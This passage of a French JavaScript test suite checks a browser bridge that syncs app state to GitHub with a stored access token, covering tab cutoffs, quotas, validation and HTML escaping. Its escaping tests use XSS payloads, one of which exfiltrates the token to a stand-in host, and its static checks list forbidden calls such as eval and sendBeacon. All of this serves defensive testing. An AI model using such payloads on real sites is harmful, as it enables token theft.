  assert.strictEqual(X.gh.journal.length, n2 + 1, 'la requête déjà partie aboutit, aucune autre ne part'); assert.strictEqual(X.st().etat, 'coupe'); assert.ok(!X.ls.has('aura_pont_pat')); assert.strictEqual(X.timers.size, 0);
  // coupé pendant une requête qui, elle, échoue (401) : l'état reste « coupé », aucun incident n'est compté, aucune pause n'est posée
  X = monde(); await X.activer(PAT_OK); lache = null; const f2 = X.c.fetch; X.c.fetch = (u, i) => new Promise(res => { lache = () => { delete X.gh.jetons[PAT_OK]; res(f2(u, i)); }; });
  await X.avancer(15000); X.c.pontDirectCouper(); X.c.fetch = f2; lache(); await X.avancer(H);
  assert.strictEqual(X.st().etat, 'coupe'); assert.strictEqual(X.st().echecs, 0); assert.strictEqual(X.st().pauseUntil, 0); assert.ok(/^coupé · le PAT est effacé/.test(ligne(X)));
  // coupé à chaque étape de l'activation (dépôt, fichier-témoin, écriture impossible, etat.json) : le PAT n'est pas gardé, plus rien ne part
  for (let etape = 0; etape < 4; etape++) {
    X = monde(); let k = 0; lache = null; const f1 = X.c.fetch; X.c.fetch = (u, i) => (k++ === etape ? new Promise(res => { lache = () => res(f1(u, i)); }) : f1(u, i));
    X.els.pontDirectPat.value = PAT_OK; X.c.pontDirectActiver(); await X.avancer(5000); assert.ok(lache, 'étape ' + etape);
    X.c.pontDirectCouper(); lache(); await X.avancer(H);
    assert.ok(!X.ls.has('aura_pont_pat'), 'étape ' + etape); assert.strictEqual(X.st().etat, 'coupe'); assert.strictEqual(X.stats.intervals.length, 0); assert.strictEqual(X.gh.journal.length, etape + 1, 'rien ne part après « Couper » : ' + chemins(X.gh.journal));
    assert.ok(/^coupé · le PAT est effacé/.test(ligne(X)), ligne(X)); assert.strictEqual(X.els.pontDirectPat.value, ''); assert.strictEqual(X.gh.ecritsCode, 0);
    if (etape === 3) assert.ok(X.gh.existe('etat.json'), 'l\'écriture déjà partie aboutit… mais le PAT n\'est pas gardé');
  }
  // « Activer » pendant qu'un battement est en cours (réactivation après une coupure depuis un autre onglet) : le pont le dit
  X = monde(); await X.activer(PAT_OK); lache = null; const f3 = X.c.fetch; X.c.fetch = (u, i) => new Promise(res => { lache = () => res(f3(u, i)); });
  await X.avancer(15000); X.ls.delete('aura_pont_pat'); X.c.fetch = f3; lache(); await X.avancer(15000); assert.strictEqual(X.st().etat, 'coupe');
  const g = X.c.fetch; X.c.fetch = (u, i) => new Promise(() => {}); X.els.pontDirectPat.value = PAT_OK; X.c.pontDirectActiver(); await X.vider();
  X.els.pontDirectPat.value = PAT_OK; X.c.pontDirectActiver(); await X.vider(); assert.ok(/encore occupé/.test(ligne(X)), ligne(X)); X.c.fetch = g;
  await X.avancer(25000); assert.strictEqual(X.st().etat, 'coupe', 'le contrôle abandonné à 20 s'); assert.ok(/réseau : délai dépassé/.test(ligne(X)), ligne(X));
});
T('P33 · relecture — deux onglets de la même page (même stockage) : « Couper » dans l\'un arrête l\'autre au battement suivant ; un PAT changé dans l\'un arrête l\'autre SANS effacer le nouveau ; une demande servie par l\'un n\'est pas resservie par l\'autre', async () => {
  const L = new Map(), A = monde({ lsMap: L }); await A.activer(PAT_OK);
  const B = monde({ lsMap: L, gh: A.gh, t0: A.clock.t });
  await B.avancer(20000); assert.strictEqual(B.st().etat, 'actif');
  const id = A.demande(1, 'backup'); await A.jusqua(() => A.rep(id) !== null); assert.ok(A.rep(id).ok); A.gh.retirer('reponses/' + id + '.json');
  await B.avancer(MIN); assert.strictEqual(B.rep(id), null, 'servie par A : B ne la resert pas'); assert.strictEqual(A.gh.chemins().filter(p => p.startsWith('backups/a')).length, 1);
  A.c.pontDirectCouper(); assert.ok(!L.has('aura_pont_pat'));
  const n = A.gh.journal.length; await B.avancer(16000);
  assert.strictEqual(B.st().etat, 'coupe'); assert.ok(/coupé depuis un autre onglet/.test(ligne(B)), ligne(B)); assert.strictEqual(B.timers.size, 0); assert.strictEqual(A.gh.journal.length, n, 'B s\'arrête sans une requête de plus');
  await B.avancer(H); assert.strictEqual(A.gh.journal.length, n);
  const C = monde({ lsMap: L, gh: A.gh, t0: B.clock.t }); await C.activer(PAT_OK); const D = monde({ lsMap: L, gh: A.gh, t0: C.clock.t }); await D.avancer(20000); assert.strictEqual(D.st().etat, 'actif');
  const autre = PAT_RO.replace(/C/g, 'F'); A.gh.jetons[autre] = { pont: 'rw', code: null };
  C.c.pontDirectCouper(); await C.activer(autre, 6000); assert.strictEqual(L.get('aura_pont_pat'), autre);   // 6 s : les écritures de D (horloge en avance) comptent dans l'écart de 2 s
  await D.avancer(16000); assert.strictEqual(D.st().etat, 'coupe'); assert.ok(/le PAT a changé dans un autre onglet/.test(ligne(D)), ligne(D)); assert.strictEqual(L.get('aura_pont_pat'), autre, 'le nouveau PAT n\'est pas effacé');
  // stockage qui ne répond plus (lecture qui lève) : ce n'est pas une coupure
  const E = monde({ ls: { aura_pont_pat: PAT_OK } }); await E.avancer(20000); assert.strictEqual(E.st().etat, 'actif');
  E.c.localStorage.getItem = () => { throw new Error('SecurityError'); }; const id2 = E.demande(2, 'ping'); await E.avancer(MIN); assert.strictEqual(E.st().etat, 'actif'); assert.ok(E.rep(id2).ok);
});
T('P34 · relecture — le marqueur de 00 (window._auraLastOp, nommé par la ligne « Gel » de 08) : chaque réponse réseau du pont l\'écrase (VRAI habillage de 00) et le pont le REMET ; une opération lourde du pont, elle, s\'annonce (« pont:backup ») comme toute opération lourde de l\'app', async () => {
  const X = monde(); X.c._auraLastOp = { name: 'guardianDownload', at: 1 }; const op0 = X.c._auraLastOp;
  await X.activer(PAT_OK); await X.avancer(5 * MIN);
  assert.ok(X.gh.journal.length > 20); assert.strictEqual(X.c._auraLastOp, op0, 'le marqueur d\'avant le pont, intact');
  const Y = monde({ src: M.PONT.replace("if (op && op !== avant && op.name === marque) window._auraLastOp = avant;", '') }); Y.c._auraLastOp = op0; await Y.activer(PAT_OK);
  assert.ok(/^fetch api\.github\.com\/repos\/ramizxhixha-a11y\/aura-pont/.test(Y.c._auraLastOp.name), 'contrôle : sans la remise, 00 attribue au pont : ' + Y.c._auraLastOp.name);
  const b = X.demande(1, 'backup'); await X.jusqua(() => X.rep(b) !== null);
  assert.strictEqual(X.c._auraLastOp.name, 'pont:backup', 'un gel pendant un backup serait nommé « pont:backup » : c\'est dit dans l\'en-tête');
  X.c._auraLastOp = { name: 'saveState', at: 2 }; const op1 = X.c._auraLastOp; await X.avancer(MIN); assert.strictEqual(X.c._auraLastOp, op1);
  const Z = monde({ sans00: true }); await Z.activer(PAT_OK); assert.strictEqual(Z.c._auraLastOp, undefined, 'sans 00 : rien n\'est posé');
});

// ───────────── J · statique, page, erreurs ─────────────
T('P35 · textes : ni eval, ni Function, ni Math.random, showToast, _decErr, XMLHttpRequest, sendBeacon, WebSocket, cookie ; un seul innerHTML (texte fixe) ; 17 ne connaît ni fetch, ni setInterval, ni écouteur, ni le PAT (une seule minuterie : la borne de 3 s) ; la sonde vise CE fichier, déclaré dans le HTML ; ≤ 500 lignes ; en-têtes au jeton', () => {
  const p = codeStrict(M.PONT), l = codeStrict(M.LECT);   // les textes SOUS ESSAI (ceux des arguments, pour les mutations)
  for (const [nom, s, brut] of [[F17B, p, M.PONT], [F17, l, M.LECT]]) {
    for (const re of [/\beval\s*\(/, /\bFunction\s*\(/, /Math\.random/, /showToast/, /_decErr/, /XMLHttpRequest/, /sendBeacon/, /WebSocket/, /document\.cookie/, /document\.write/, /insertAdjacentHTML/, /outerHTML/, /\bimport\s*\(/, /setTimeout\(\s*['"`]/, /postMessage/, /\bnew\s+Proxy/, /__defineGetter__|__lookupGetter__/]) assert.ok(!re.test(s), nom + ' : ' + re);
    assert.ok(brut.split('\n').length <= 501, nom + ' ≤ 500 lignes');
  }
  for (const re of [/\bfetch\s*\(/, /setInterval/, /addEventListener/, /aura_pont_pat/, /\.setItem|\.removeItem/, /Authorization/]) assert.ok(!re.test(l), F17 + ' : ' + re);
  assert.strictEqual((l.match(/setTimeout\(/g) || []).length, 1, '17 : une seule minuterie, celle de borne()'); assert.ok(l.includes('function borne(p, ms) { return new Promise(function (ok) { var to = setTimeout('));
  assert.deepStrictEqual(l.match(/localStorage\.getItem\([^)]*\)/g), ["localStorage.getItem('aura_throttle_log')"]);
  assert.strictEqual((p.match(/\.innerHTML/g) || []).length, 1); const html = between(p, 'bar.innerHTML = ', "(el('claudeExportBar') || tabs)", false).slice('bar.innerHTML = '.length);
  assert.deepStrictEqual([...new Set(html.replace(/'(?:[^'\\]|\\.)*'/g, '').match(/[A-Za-z_$][\w$]*/g))].sort(), ['BTN', 'PONT_V'], 'le HTML de la barre ne contient que du texte fixe');
  assert.deepStrictEqual(p.match(/localStorage\.\w+/g).sort(), ['localStorage.getItem', 'localStorage.removeItem', 'localStorage.setItem']);
  assert.strictEqual((p.match(/\bfetch\s*\(/g) || []).length, 1, 'un seul appel réseau, dans gh()');
  assert.ok(p.includes("if (!jeton) return Promise.reject(new Error('pont coupé'));\n    if (url !== DEPOT && url.indexOf(DEPOT + '/') !== 0 && url !== SONDE) return Promise.reject(new Error('adresse hors du pont'));\n    var h = { 'Authorization': 'Bearer ' + jeton, 'Accept': 'application/vnd.github+json' };"), 'garde d\'adresse AVANT l\'en-tête Authorization');
  assert.strictEqual((p.match(/Authorization/g) || []).length, 1, 'le PAT n\'entre dans une requête qu\'à un endroit'); assert.ok(p.includes("redirect: 'error'") && p.includes("cache: 'no-store'") && p.includes("credentials: 'omit'"));
  assert.ok(p.includes("var SONDE = API + 'aura/contents/" + F17B + "';")); assert.ok(fs.existsSync(path.join(ROOT, F17B)));
  assert.ok(p.includes("var CMDS = ['ping', 'etat', 'diag', 'lire', 'backup'];")); assert.ok(p.includes("var LS_PAT = 'aura_pont_pat', LS_MEM = 'aura_pont_mem';"));
  assert.deepStrictEqual([...new Set(p.match(/window\._perfOp|window\.buildSnapshot|window\.(?!(?:add|remove)EventListener)\w+\s*\(/g) || [])].sort(), ['window._perfOp', 'window.buildSnapshot'], 'de l\'app, le pont n\'appelle que buildSnapshot et _perfOp');
  assert.ok(M.PONT.startsWith('// ═══ [PONT DIRECT · 11/10/2026] VERSION ' + PONT_TOK + ' · « go pont »')); assert.ok(M.LECT.startsWith('// ═══ [PONT DIRECT · 11/10/2026] VERSION ' + PONT_TOK + ' · LECTURE'));
  assert.ok(p.includes("var PONT_V = '" + PONT_TOK + "'") && l.includes("var LECT_V = '" + PONT_TOK + "'"));
});
T('P36 · HTML : 17-pont-lecture puis 17b-pont-direct, une fois chacun, juste après 16b, au jeton courant ; aucun autre fichier chargé ne connaît aura_pont_pat ; les énumérations de localStorage du dépôt sont celles relues le 11/10 (03 et 06 : noms et tailles ; Guardian : seulement un JSON d\'état — le PAT n\'en est pas un)', () => {
  assert.ok(HTML.includes('<script src="js/16b-fiscal-ecran.js?v=' + TOK + '"></script>\n<script src="' + F17 + '?v=' + TOK + '"></script>\n<script src="' + F17B + '?v=' + TOK + '"></script>\n'));
  assert.strictEqual(HTML.split('src="' + F17 + '?').length, 2); assert.strictEqual(HTML.split('src="' + F17B + '?').length, 2);
  const charges = [...HTML.matchAll(/<script[^>]*\bsrc="([^"?]+)/g)].map(m => m[1]), autres = charges.concat(['aura-guardian.html', 'AURA8_v118.html', 'sw.js']).filter(f => f !== F17B);
  assert.deepStrictEqual(autres.filter(f => /aura_pont_(pat|mem)/.test(rd(f))), []);
  const enumere = /localStorage\.key\(|Object\.(?:keys|entries|values)\(\s*(?:window\.)?localStorage|localStorage\.length|JSON\.stringify\(\s*(?:window\.)?localStorage|\.\.\.\s*(?:window\.)?localStorage|localStorage\.clear\(/;
  assert.deepStrictEqual(charges.concat(['aura-guardian.html', 'sw-reset.html']).filter(f => enumere.test(rd(f))).sort(), ['aura-guardian.html', 'guardian-core.js', 'js/03-per-pair-position-buttons-controls-buid.js', 'js/06-v63-patterns-chartistes.js'],
    'un fichier de plus énumère localStorage : relire ce qu\'il fait des VALEURS avant de livrer (le PAT y vit)');
});
T('P37 · erreurs de la page : écoutées seulement quand le pont est actif (30 gardées, texte borné), dites dans etat.json ; un message de GitHub hostile reste du TEXTE à l\'écran ; 17 absent : l\'état part quand même et le DIT, les demandes qui lisent l\'app sont refusées proprement (relecture)', async () => {
  let X = monde(); assert.deepStrictEqual(X.winL, []);
  await X.activer(PAT_OK);
  const err = X.winL.find(x => x[0] === 'error')[1], rej = X.winL.find(x => x[0] === 'unhandledrejection')[1];
  for (let i = 0; i < 40; i++) err({ message: 'Uncaught TypeError: x' + i + ' ' + 'z'.repeat(400), filename: 'https://h/aura/js/08-learning-history-render.js?v=' + TOK, lineno: 100 + i });
  rej({ reason: new Error('promesse cassée') }); rej({ reason: 'texte' }); rej(null);
  X.c.pontDirectEnvoyer(); await X.avancer(3000);
  const e = JSON.parse(X.gh.texte('etat.json')).erreurs; assert.strictEqual(e.n, 43); assert.strictEqual(e.dernieres.length, 5); assert.strictEqual(e.dernieres[2].m, 'promesse : promesse cassée'); assert.strictEqual(e.dernieres[1].ou, '08-learning-history-render.js:139'); assert.ok(e.dernieres[1].m.length <= 200);
  const d = X.demande(1, 'diag'); await X.avancer(20000); assert.strictEqual(X.rep(d).r.erreursPage.length, 30);
  const mechant = '<img src=x onerror="alert(1)"><script>alert(2)</script>'; X.gh.panne(() => ({ st: 500, j: { message: mechant } })); await X.avancer(MIN);
  assert.ok(ligne(X).includes('<img src=x onerror=')); assert.ok(!X.els.pontDirectBar.innerHTML.includes('onerror')); assert.ok(!Object.values(X.els).some(el => el !== X.els.pontDirectEtat && /onerror/.test(String(el.textContent) + String(el._html))));
  X = monde({ sansLecture: true }); assert.strictEqual(X.c._pontLecture, undefined); await X.activer(PAT_OK);
  assert.strictEqual(X.st().etat, 'actif'); const e2 = JSON.parse(X.gh.texte('etat.json')); assert.strictEqual(e2._err, 'lecture : 17-pont-lecture.js absent'); assert.strictEqual(e2.doc, TOK); assert.ok(e2.etatPont);
  const l = X.demande(1, 'lire', { quoi: 'S' }), p = X.demande(2, 'ping'), dg = X.demande(3, 'diag'); await X.avancer(MIN);
  assert.strictEqual(X.rep(l).err, 'erreur : 17-pont-lecture.js absent'); assert.strictEqual(X.rep(dg).err, 'erreur : 17-pont-lecture.js absent'); assert.strictEqual(X.rep(p).ok, true);
});
T('P38 · valider et dateDuNom (fonctions réelles) : table de vérité ; base64 UTF-8 aller-retour (accents, émojis, 100 000 caractères)', async () => {
  const X = monde(), P = X.c._pont, t = T0;
  assert.strictEqual(P.valider({ id: 'a', cmd: 'ping', t }, 'a', t), null); assert.strictEqual(P.valider({ id: 'a', cmd: 'lire', t, args: {} }, 'a', t), null);
  assert.ok(/objet/.test(P.valider(null, 'a', t))); assert.ok(/objet/.test(P.valider('ping', 'a', t))); assert.ok(/objet/.test(P.valider([], 'a', t))); assert.ok(/id/.test(P.valider({ cmd: 'ping', t }, 'a', t))); assert.ok(/t \(ms\)/.test(P.valider({ id: 'a', cmd: 'ping', t: '1' }, 'a', t))); assert.ok(/t \(ms\)/.test(P.valider({ id: 'a', cmd: 'ping', t: NaN }, 'a', t)));
  assert.strictEqual(P.valider({ id: 'a', cmd: 'ping', t: t - 900000 }, 'a', t), null); assert.ok(/périmée/.test(P.valider({ id: 'a', cmd: 'ping', t: t - 900001 }, 'a', t)));
  assert.strictEqual(P.valider({ id: 'a', cmd: 'ping', t: t - 3600000, ttl: 3600 }, 'a', t), null); assert.ok(/validité 3600 s/.test(P.valider({ id: 'a', cmd: 'ping', t: t - 3600001, ttl: 1e9 }, 'a', t))); assert.ok(/validité 1 s/.test(P.valider({ id: 'a', cmd: 'ping', t: t - 1001, ttl: -5 }, 'a', t)));
  assert.strictEqual(P.valider({ id: 'a', cmd: 'ping', t: t + 300000 }, 'a', t), null); assert.ok(/futur/.test(P.valider({ id: 'a', cmd: 'ping', t: t + 300001 }, 'a', t)));
  assert.ok(/périmée/.test(P.valider({ id: 'a', cmd: 'x', t: t - 86400001 }, 'a', t)), 'plus de cas « oubli » : une demande lue reçoit toujours sa réponse'); assert.ok(/args/.test(P.valider({ id: 'a', cmd: 'ping', t, args: null }, 'a', t))); assert.ok(/args/.test(P.valider({ id: 'a', cmd: 'ping', t, args: [] }, 'a', t)));
  assert.strictEqual(P.dateDuNom('20261011-094512-ab12'), T0); assert.ok(Number.isNaN(P.dateDuNom('x'))); assert.strictEqual(P.dateDuNom('20261231-235959-zz99'), Date.UTC(2026, 11, 31, 23, 59, 59));
  assert.deepStrictEqual(J(P.CMDS), ['ping', 'etat', 'diag', 'lire', 'backup']); assert.ok(Object.isFrozen(P)); assert.ok(Object.isFrozen(X.c._pontLecture));
  const s = 'état é à ç € 😀 — ' + 'aé'.repeat(50000); assert.strictEqual(P.texteB64(P.b64Texte(s)), s); assert.strictEqual(Buffer.from(P.b64Texte(s), 'base64').toString('utf8'), s);
  assert.strictEqual(P.texteB64('w6l0\nYXQ='), 'état');
});
T('P39 · rejeu/pont.js (côté session), statique — le comportement est tenu par banc-pont-outil.js : ni eval, ni Function, ni vm, ni require d\'un chemin du dépôt, git seul et sans shell, AUCUN arbre de travail d\'aura-pont (miroir nu, plomberie) ; chemins écrits dans aura-pont passés par la liste blanche ; mêmes listes fermées que l\'app', () => {
  const brut = rd('rejeu/pont.js'), o = codeStrict(brut);
  for (const re of [/\beval\s*\(/, /\bFunction\s*\(/, /require\('vm'\)/, /cp\.exec\s*\(/, /execSync/, /\bspawn/, /shell\s*:/, /require\(\s*[^'"]/, /'clone'/, /'checkout'/, /'pull'/, /'worktree'/, /'add', '-A'/]) assert.ok(!re.test(o), 'pont.js : ' + re);
  assert.deepStrictEqual([...new Set(o.match(/cp\.\w+\(\s*'[^']*'/g))], ["cp.execFileSync('git'"]);
  assert.ok(o.includes("['--git-dir=' + MIROIR]"), 'toutes les commandes git visent le miroir nu'); assert.ok(o.includes("'init', '--quiet', '--bare'"));
  assert.ok(o.includes("if (!RE_PROTOCOLE.test(chemin)) throw new Error('chemin hors protocole : ' + chemin);"), 'liste blanche avant toute écriture');
  assert.deepStrictEqual((o.match(/fs\.writeFileSync\([^,]+/g) || []).sort(), ['fs.writeFileSync(cible', 'fs.writeFileSync(f', "fs.writeFileSync(path.join(SORTIE"].sort(), 'n\'écrit que dans la sortie et le dossier des backups du pont');
  assert.ok(o.includes("fs.writeFileSync(cible, txt, { flag: 'wx' })"), 'un backup reçu n\'écrase jamais un fichier');
  assert.ok(o.includes('zlib.gunzipSync(b, { maxOutputLength: MAX.backupClair })'), 'décompression bornée');
  assert.ok(o.includes("const CMDS = ['ping', 'etat', 'diag', 'lire', 'backup'], SOURCES = ['S', 'RT', 'rec', 'tl', 'lents', 'throttle', 'pont'];"));
  assert.deepStrictEqual(J(monde().c._pontLecture.sources), ['S', 'RT', 'rec', 'tl', 'lents', 'throttle', 'pont']);
  assert.ok(o.includes("RE_BACKUP = /^backups\\/(aura_guardian_full_\\d{8}-\\d{6}\\.json)(\\.gz)?$/"), 'le nom du backup reçu est validé avant d\'écrire');
  assert.ok(brut.startsWith('// [PONT DIRECT · 11/10/2026] VERSION ' + PONT_TOK));
});

T('P40 · relecture — les titres d\'actualités (CoinStats, 10e7) sont du TEXTE : les VRAIS rendus de 04 (renderSentimentNewsSection) et 05 (renderNewsScoreSection) échappent titre et source ; un titre piégé ne devient jamais une balise (il aurait pu lire le PAT du pont)', () => {
  const s04 = rd('js/04-v8-0-livraison-35-mode-max-permissif-v.js'), s05 = rd('js/05-v37-19-indicateur-de-fatigue-bot.js');
  const f04 = between(s04, 'function renderSentimentNewsSection() {', '\nfunction ', false), f05 = between(s05, 'function renderNewsScoreSection() {', '\nfunction ', false);
  const piege = '<img src=x onerror="fetch(\'//x.yz/\'+localStorage.aura_pont_pat)">titre', source = '<script>alert(1)</script>';
  const vue = { hasKey: true, alive: true, isFetching: false, error: null, http: 200, lastFetch: 1, ageMin: 0, calls: 1, count: 1, minScored: 3, global: { score: 60, label: 'haussier', nScored: 5, n: 5 },
    pairs: { 'BTC/USDT': { n: 5, nScored: 5, score: 60, label: 'haussier', bull: 3, bear: 1, top: [{ title: piege, s: 0.5 }, { title: null, s: 0 }] } }, recent: [{ title: piege, source, s: 0.5, ts: Date.now() - 3600000, bull: 2, bear: 0, words: [{ w: 'surge', type: 'bull' }] }, { title: undefined, source: undefined, s: -0.5, ts: Date.now(), bull: 0, bear: 1, words: [] }] };
  for (const [f, id, nom] of [[f04, 'sentimentNewsSection', 'renderSentimentNewsSection'], [f05, 'newsScoreSection', 'renderNewsScoreSection']]) {
    const el = { innerHTML: '' }, sb = { document: { getElementById: k => (k === id ? el : null) }, _newsView: () => vue, S: { newsApiKey: '' }, PAIRS: { 'BTC/USDT': { color: '#f7931a' } }, Date, Math, Object, String, JSON }; sb.window = sb;
    vm.runInNewContext(f + '\n' + nom + '();', sb);
    assert.ok(el.innerHTML.length > 500, nom); assert.ok(!/<img|<script/i.test(el.innerHTML), nom + ' : balise piégée rendue');   // « onerror= » peut rester, en TEXTE : sans « < » aucune balise ne se forme
    assert.ok(el.innerHTML.includes('&#60;img src=x onerror=&#34;fetch(&#39;//x.yz/&#39;+localStorage.aura_pont_pat)&#34;&#62;titre'.slice(0, nom === 'renderSentimentNewsSection' ? 60 : 200)), nom + ' : le titre reste lisible, en texte');
    if (nom === 'renderSentimentNewsSection') assert.ok(el.innerHTML.includes('&#60;script&#62;alert(1)&#60;/script&#62;'), 'source échappée');
  }
});

T('P41 · relecture — une entrée « empoisonnée » (la liste la dit fichier, sa lecture ne donne pas de contenu : sous-module…) n\'est lue que 3 fois puis écartée : elle ne bloque pas la file', async () => {
  const X = monde(); await X.activer(PAT_OK);
  const ok1 = X.demande(1, 'ping'), poison = X.nom(9); X.gh.poserSpecial('demandes/' + poison + '.json', { type: 'file', size: 10, sha: 'b'.repeat(40) }, { type: 'submodule', name: poison + '.json' });
  await X.avancer(16000);
  assert.strictEqual(X.rep(ok1), null, 'la plus récente (le poison) bloque ce relevé'); assert.ok(/illisible/.test(X.st().err), X.st().err);
  await X.avancer(45000);
  assert.ok(X.rep(ok1) && X.rep(ok1).ok, 'après 3 lectures le poison est écarté, la file reprend');
  const lus = () => X.gh.journal.filter(r => r.m === 'GET' && r.url.endsWith(poison + '.json')).length; assert.strictEqual(lus(), 3);
  await X.avancer(10 * MIN); assert.strictEqual(lus(), 3, 'plus jamais relue'); assert.strictEqual(X.rep(poison), null); assert.strictEqual(X.st().echecs, 0);
});

T('P42 · une seule place pour les demandes cette heure-ci : un ping passe, un backup (deux écritures : le fichier et la réponse) ATTEND — rien n\'est bâti ni écrit — et passe quand l\'heure tourne', async () => {
  const X = monde({ ls: { aura_pont_mem: seme(46, 30 * MIN) } }); await X.activer(PAT_OK); assert.strictEqual(mem(X).ecrits.length, 48);   // 60 − 12 gardées − 48 = 0 place
  const b = X.demande(1, 'backup'); await X.avancer(MIN);
  assert.strictEqual(X.rep(b), null); assert.strictEqual(X.gh.chemins().filter(p => p.startsWith('backups/a')).length, 0); assert.deepStrictEqual(X.stats.ops, [], 'rien n\'est exécuté');
  const Y = monde({ ls: { aura_pont_mem: seme(45, 30 * MIN) } }); await Y.activer(PAT_OK); assert.strictEqual(mem(Y).ecrits.length, 47);   // une place
  const yb = Y.demande(1, 'backup', undefined, { ttl: 3600 }); await Y.avancer(MIN);
  assert.strictEqual(Y.rep(yb), null, 'le backup attend'); assert.strictEqual(Y.gh.chemins().filter(p => p.startsWith('backups/a')).length, 0); assert.deepStrictEqual(Y.stats.ops, []); assert.ok(/quota d'écritures/.test(Y.st().err), Y.st().err);
  const yp = Y.demande(2, 'ping'); await Y.avancer(MIN); assert.ok(Y.rep(yp) && Y.rep(yp).ok, 'un ping (une écriture) passe');
  await Y.jusqua(() => Y.rep(yb) !== null, 15000, 200); assert.strictEqual(Y.rep(yb).ok, true); assert.strictEqual(Y.gh.chemins().filter(p => p.startsWith('backups/a')).length, 1); assert.ok(Y.clock.t - T0 > 29 * MIN, 'quand les écritures semées sortent de l\'heure');
});

(async () => {
  console.log('PONT DIRECT · ' + F17B + (process.argv[2] ? ' ← ' + process.argv[2] : '') + ' · ' + F17 + (process.argv[3] ? ' ← ' + process.argv[3] : ''));
  const seul = process.env.PONT_SEUL ? new RegExp(process.env.PONT_SEUL) : null;   // PONT_SEUL='^P2[45] ' : n'exécuter que ces essais (mise au point)
  for (const [name, fn] of TESTS) {
    if (seul && !seul.test(name)) continue;
    try { await fn(); pass++; console.log('  ✓ ' + name); }
    catch (e) { fail++; console.log('  ✗ ' + name + '\n      ' + String((e && e.stack) || e).split('\n').slice(0, 4).join('\n      ')); }
  }
  console.log((fail ? '❌ ' : '✅ ') + pass + '/' + (pass + fail) + ' tests passés');
  process.exit(fail ? 1 : 0);
})();
